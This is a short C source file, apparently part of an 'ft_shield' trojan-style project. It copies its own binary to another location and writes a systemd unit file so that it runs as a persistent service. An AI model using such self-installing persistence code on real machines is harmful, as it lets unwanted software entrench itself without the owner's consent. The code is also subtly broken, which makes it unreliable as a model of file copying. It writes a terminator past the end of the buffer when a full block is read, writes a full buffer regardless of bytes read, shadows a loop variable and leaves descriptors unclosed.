#include "ft_shield.h"

static void move_bin() {
	int fd = open(FT_SHIELD, O_RDWR);
	int bin = open(BIN_FILE, O_RDWR | O_CREAT);
	if (fd < 0 || bin < 0) {
		return ;
	}

	int bytes = 0;
	do
	{
		char buff[BUFFER_SIZE];
		int bytes = read(fd, buff, BUFFER_SIZE);
		if (bytes <= 0) {
			return ;
		}
		buff[bytes] = 0;
		write(bin, buff, BUFFER_SIZE);
	} while (bytes);
}

void systemd() {
	move_bin();
	int fd = open(SYS_FILE, O_RDWR | O_CREAT);
	if (fd < 0) {
		return ;
	}

	write(fd, SYSTEMD_OPT, strlen(SYSTEMD_OPT));
	close(fd);
}